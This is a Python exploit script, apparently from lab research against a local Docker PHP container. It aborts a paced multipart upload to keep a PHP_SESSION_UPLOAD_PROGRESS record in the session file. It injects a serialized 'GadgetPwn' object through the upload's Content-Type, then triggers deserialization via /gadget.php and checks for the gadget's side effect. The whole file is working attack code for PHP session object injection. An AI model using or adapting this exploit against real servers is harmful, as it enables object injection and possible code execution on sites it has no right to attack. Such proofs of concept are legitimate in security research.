#!/usr/bin/env python3
"""up5: reliable ABORT (paced send + huge Content-Length) -> keep php_binary
progress record; then victim decodes with flipped 'php' handler.

up4 lesson: fast blast = server sees completed request = record auto-deleted.
This probe paces 64KB/150ms against CL=100M and RSTs mid-read, so the parser
is blocked in a body read when the reset lands (true abort, like up2).
Variants: clean CT (control), payload CT (x|O:9:"GadgetPwn":0:{}|).
Then: dump sess file, GET /gadget.php, check /tmp/x_gadget.
"""
import socket, subprocess, urllib.request, uuid, time

HOST, PORT = "127.0.0.1", 8086

def run(tag, ct):
    SID = uuid.uuid4().hex
    P = "u5_" + tag
    body_head = (
        "------up5\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        + P + "\r\n"
        "------up5\r\n"
        "Content-Disposition: form-data; name=\"f\"; filename=\"ok.txt\"\r\n"
        "Content-Type: " + ct + "\r\n\r\n"
    ).encode("latin1")
    TOTAL = 100_000_000  # declare huge; we send ~2M then abort
    req = (
        "POST /target.php HTTP/1.1\r\n"
        "Host: 127.0.0.1:8086\r\n"
        "Cookie: PHPSESSID=" + SID + "\r\n"
        "Content-Type: multipart/form-data; boundary=----up5\r\n"
        "Content-Length: " + str(len(body_head) + TOTAL) + "\r\n"
        "\r\n"
    ).encode()
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.sendall(req + body_head)
    pad = b"P" * 65536
    sent = 0
    while sent < 2_000_000:
        s.sendall(pad); sent += len(pad)
        time.sleep(0.15)  # keep parser mid-read
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
    s.close()
    time.sleep(1.0)
    r = subprocess.run(["docker", "exec", "php_up", "sh", "-c",
                        "wc -c < /tmp/sess_" + SID + " 2>/dev/null || echo MISSING"],
                       capture_output=True, timeout=20)
    size = r.stdout.decode().strip()
    raw = b""
    if size not in ("MISSING", "0"):
        raw = subprocess.run(["docker", "exec", "php_up", "cat", "/tmp/sess_" + SID],
                             capture_output=True, timeout=20).stdout
    print("[%s] sess=%s bytes" % (tag, size), flush=True)
    if raw:
        print("    latin1:", raw.decode("latin1", "replace")[:420], flush=True)
    if not raw:
        return
    # victim decode with flipped handler
    rq = urllib.request.Request("http://127.0.0.1:8086/gadget.php",
                                headers={"Cookie": "PHPSESSID=" + SID})
    try:
        with urllib.request.urlopen(rq, timeout=60) as r2:
            print("    B:", r2.status, flush=True)
            print("    B body:", r2.read().decode("latin1", "replace")[:600], flush=True)
    except Exception as e:
        print("    B: ERR", str(e)[:200], flush=True)
    xg = subprocess.run(["docker", "exec", "php_up", "sh",
                         "-c", "cat /tmp/x_gadget 2>/dev/null || echo NO_XG"],
                        capture_output=True, timeout=20)
    print("    x_gadget:", xg.stdout.decode("latin1", "replace").strip(), flush=True)

run("clean", "application/octet-stream")
run("payload", 'x|O:9:"GadgetPwn":0:{}|')
